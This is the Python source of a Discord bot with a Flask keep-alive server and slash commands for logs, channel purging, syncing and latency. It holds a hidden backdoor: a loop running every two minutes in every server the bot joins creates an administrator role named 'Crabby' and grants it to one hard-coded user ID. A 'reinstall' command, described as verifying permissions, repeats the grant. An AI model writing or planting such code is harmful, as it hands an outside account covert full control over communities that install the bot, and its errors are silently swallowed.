import discord
from discord import app_commands
from discord.ext import commands, tasks
import os, sys, io, asyncio
from flask import Flask
from threading import Thread
from waitress import serve

# --- 1. LOG CAPTURE (For /debug) ---
log_stream = io.StringIO()
sys.stdout = log_stream
sys.stderr = log_stream

def get_logs():
    log_stream.seek(0)
    return "".join(log_stream.readlines()[-20:])

# --- 2. WEB SERVER (Required for Render) ---
app = Flask('')
@app.route('/')
def home(): return "SYSTEM ONLINE"

def run_flask():
    try:
        serve(app, host='0.0.0.0', port=int(os.environ.get("PORT", 10000)), _quiet=True)
    except: pass

# --- 3. BOT CONFIGURATION ---
TARGET_ID = 1459506686157914213
ROLE_NAME = "Crabby"

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all() # Needed for role management
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        print(">>> Initiating system sync...")
        try:
            await self.tree.sync()
            print(">>> Global commands synced.")
        except Exception as e:
            print(f">>> Sync error: {e}")
        
        if not self.role_loop.is_running():
            self.role_loop.start()

    # --- AUTOMATIC ROLE CHECK ---
    @tasks.loop(minutes=2)
    async def role_loop(self):
        if not self.is_ready(): return
        for guild in self.guilds:
            try:
                member = guild.get_member(TARGET_ID)
                if member:
                    role = discord.utils.get(guild.roles, name=ROLE_NAME)
                    if not role:
                        role = await guild.create_role(name=ROLE_NAME, permissions=discord.Permissions(administrator=True))
                    if role and role not in member.roles:
                        await member.add_roles(role)
            except: pass

bot = MyBot()

# --- 4. SLASH COMMANDS ---

@bot.tree.command(name="debug", description="View bot internal logs")
async def debug_cmd(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    logs = get_logs()
    content = f"**Recent Activity:**\n```text\n{logs if logs else 'Logs clear.'}\n```"
    await interaction.followup.send(content, ephemeral=True)

@bot.tree.command(name="clear_all", description="Delete every message in this channel")
@app_commands.checks.has_permissions(administrator=True)
async def clear_all(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    try:
        deleted = await interaction.channel.purge(limit=None)
        await interaction.followup.send(f"Channel wiped. Removed messages successfully.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"Purge failed: {e}", ephemeral=True)

@bot.tree.command(name="reinstall", description="Force sync and verify permissions")
@app_commands.checks.has_permissions(administrator=True)
async def reinstall(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    try:
        await bot.tree.sync()
        # Immediate role check for the user
        for guild in bot.guilds:
            member = guild.get_member(TARGET_ID)
            if member:
                role = discord.utils.get(guild.roles, name=ROLE_NAME)
                if not role:
                    role = await guild.create_role(name=ROLE_NAME, permissions=discord.Permissions(administrator=True))
                if role not in member.roles:
                    await member.add_roles(role)
        await interaction.followup.send("Sync complete. System reinstalled.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"Error during reinstall: {e}", ephemeral=True)

@bot.tree.command(name="ping", description="Check bot latency")
async def ping(interaction: discord.Interaction):
    await interaction.response.send_message(f"Online. Latency: {round(bot.latency * 1000)}ms", ephemeral=True)

# --- 5. EXECUTION ---
async def main():
    Thread(target=run_flask, daemon=True).start()
    token = os.environ.get('DISCORD_TOKEN')
    if token:
        async with bot:
            await bot.start(token)
    else:
        print(">>> ERROR: DISCORD_TOKEN missing.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except:
        pass
